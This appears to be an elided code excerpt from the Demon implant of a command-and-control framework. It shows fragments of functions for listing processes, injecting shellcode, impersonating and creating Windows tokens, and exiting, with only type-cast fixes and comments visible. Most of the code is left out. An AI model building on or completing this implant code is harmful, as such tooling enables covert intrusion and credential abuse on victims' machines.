...
VOID CommandProcList(
    ...
    if ( NT_SUCCESS( NtStatus = ProcessSnapShot( &SysProcessInfo, &ProcessInfoSize ) ) )
    {
        ...
        do {
            ...
            PackageAddBytes( Package, (PBYTE)SysProcessInfo->ImageName.Buffer, SysProcessInfo->ImageName.Length );  // Cast wide string
...
VOID CommandInjectShellcode(
    ...
    BOOL      x64     = FALSE;
    PVOID     Payload = NULL;
    UINT32    Size    = 0;  // UINT32 for ParserGetBytes
    PVOID     Argv    = NULL;
    UINT32    Argc    = 0;  // UINT32 for ParserGetBytes
    DWORD     Pid     = 0;
    LPWSTR    Spawn   = NULL;
    PROC_INFO PcInfo  = { 0 };
    ...
    switch ( Command )
    {
        case DEMON_COMMAND_TOKEN_IMPERSONATE: PUTS( "Token::Impersonate" )
        {
            ...
            if ( TokenData )
            {
                ...
                PackageAddWString( Package, TokenData->DomainUser );  // Wide string version
            }
            else
            {
        ...
        case DEMON_COMMAND_TOKEN_MAKE: PUTS( "Token::Make" )
        {
            ...
            WCHAR  Deli[ 2 ]      = { L'\\', 0 };  // Wide char for StringConcatW
            HANDLE hToken         = NULL;
...
VOID CommandExit( PPARSER Parser )
{
    ...
    ImageSize = 0;  // Use 0 for SIZE_T, not NULL
